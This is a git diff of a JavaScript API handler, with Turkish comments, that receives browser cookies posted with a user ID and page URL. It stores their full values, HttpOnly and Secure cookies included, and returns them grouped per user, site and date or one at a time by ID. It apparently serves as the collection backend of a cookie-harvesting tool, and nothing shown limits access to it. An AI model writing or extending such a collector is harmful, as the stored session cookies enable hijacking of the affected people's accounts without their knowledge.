@@ -35,6 +35,23 @@ export default function handler(req, res) {
   }
 }
 
+function formatCookieForDisplay(cookie) {
+  return {
+    id: Date.now().toString() + Math.random().toString(36).substr(2, 9),
+    domain: cookie["Host raw"],
+    name: cookie["Name raw"],
+    value: cookie["Content raw"],
+    expires: cookie["Expires"],
+    path: cookie["Path raw"],
+    secure: cookie["Send for raw"] === "true",
+    httpOnly: cookie["HTTP only raw"] === "true",
+    sameSite: cookie["SameSite raw"],
+    hostOnly: cookie["This domain only raw"] === "true",
+    firstPartyDomain: cookie["First Party Domain"],
+    timestamp: new Date().toISOString()
+  };
+}
+
 function handlePost(req, res) {
   let body = req.body;
   if (typeof body === 'string') {
@@ -45,31 +62,78 @@ function handlePost(req, res) {
     }
   }
 
-  const data = {
-    id: Date.now().toString(),
-    time: new Date().toISOString(),
-    userId: body.userId,
-    cookieCount: body.cookies ? body.cookies.length : 0,
-    body
-  };
+  // Her bir cookie'yi ayrı bir kayıt olarak sakla
+  if (body.cookies && Array.isArray(body.cookies)) {
+    const formattedCookies = body.cookies.map(cookie => ({
+      id: Date.now().toString() + Math.random().toString(36).substr(2, 9),
+      userId: body.userId,
+      url: body.url,
+      timestamp: body.timestamp || Date.now(),
+      cookie: formatCookieForDisplay(cookie)
+    }));
 
-  posts.unshift(data);
-  res.status(200).json({ status: 'ok', received: data });
+    posts.unshift(...formattedCookies);
+
+    // Maksimum 1000 kayıt tut
+    if (posts.length > 1000) {
+      posts = posts.slice(0, 1000);
+    }
+  }
+
+  res.status(200).json({ 
+    status: 'ok', 
+    received: {
+      userId: body.userId,
+      url: body.url,
+      cookieCount: body.cookies ? body.cookies.length : 0,
+      timestamp: new Date().toISOString()
+    }
+  });
 }
 
 function handleGet(req, res) {
-  const { userId, limit } = req.query;
+  const { userId, limit, id } = req.query;
+  
+  // Tek bir cookie detayını getir
+  if (id) {
+    const cookie = posts.find(post => post.id === id);
+    if (cookie) {
+      return res.status(200).json(cookie);
+    }
+    return res.status(404).json({ error: 'Cookie not found' });
+  }
+
   let filteredPosts = posts;
 
   if (userId) {
     filteredPosts = posts.filter(post => post.userId === userId);
   }
 
-  if (limit) {
-    filteredPosts = filteredPosts.slice(0, parseInt(limit));
-  }
+  // Grupla ve sırala
+  const groupedPosts = filteredPosts.reduce((acc, post) => {
+    const key = `${post.userId}-${post.url}-${new Date(post.timestamp).toISOString().split('T')[0]}`;
+    if (!acc[key]) {
+      acc[key] = {
+        userId: post.userId,
+        url: post.url,
+        date: new Date(post.timestamp).toISOString().split('T')[0],
+        cookieCount: 0,
+        cookies: []
+      };
+    }
+    acc[key].cookieCount++;
+    acc[key].cookies.push(post);
+    return acc;
+  }, {});
 
-  res.status(200).json(filteredPosts);
+  // Sıralı liste oluştur
+  const sortedGroups = Object.values(groupedPosts)
+    .sort((a, b) => new Date(b.date) - new Date(a.date));
+
+  // Limit uygula
+  const limitedGroups = limit ? sortedGroups.slice(0, parseInt(limit)) : sortedGroups;
+
+  res.status(200).json(limitedGroups);
 }
 
 function handlePut(req, res) {
@@ -88,13 +152,10 @@ function handleDelete(req, res) {
   }
 
   if (body.userId) {
-    // Belirli bir kullanıcının verilerini sil
     posts = posts.filter(post => post.userId !== body.userId);
   } else if (body.ids && Array.isArray(body.ids)) {
-    // Seçili ID'lere sahip verileri sil
     posts = posts.filter(post => !body.ids.includes(post.id));
   } else if (body.deleteAll === true) {
-    // Tüm verileri sil
     posts = [];
   }
 
